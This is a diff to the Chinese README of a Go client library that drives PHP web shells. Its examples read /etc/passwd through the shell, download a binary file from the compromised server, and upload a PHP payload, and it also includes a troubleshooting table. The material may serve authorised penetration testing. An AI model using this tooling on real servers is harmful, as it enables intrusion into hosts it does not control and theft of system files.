@@ -83,6 +83,11 @@ res, _ := client.Do(ctx, phpshell.NewPhpFileRead("/etc/passwd"))
 frr := res.(*core.FileReadResult)
 fmt.Println(string(frr.Data))
 
+// 下载二进制文件
+res, _ = client.Do(ctx, phpshell.NewPhpFileDownload("/tmp/data.bin"))
+download := res.(*core.FileReadResult)
+os.WriteFile("./data.bin", download.Data, 0600)
+
 // 上传文件
 data, _ := os.ReadFile("./local-payload.php")
 res, _ = client.Do(ctx, phpshell.NewPhpFileUpload("/tmp/payload.php", data))
@@ -139,11 +144,13 @@ client := core.NewClient(
 )
 ```
 
+Middleware 能观察 HTTP 状态、响应解码和 Operation.Parse 的最终错误；Retry 默认只对只读操作的网络错误与超时重试。
+
 ## 常见问题
 
 | 问题 | 原因 | 解决 |
 |------|------|------|
 | `workdir= os= user=` 全空 | 用了 `ops.NewInfo()` | 换成 `phpshell.NewPhpInfo()` |
 | `sh: 1: -c: not found` | bin 路径为空 | 用 `phpshell.NewPhpExec(cmd)` |
-| `transport 未配置` | endpoint 为空 | 检查 NodeConfig.Endpoint |
+| `transport 未配置` | Client 没有配置 Transport | 使用 `core.WithTransport(...)`；Manager 使用可用的自定义 ClientFactory |
 | `ErrPolicyDenied` | readonly 拦截 | 正常行为，写操作被阻止 |
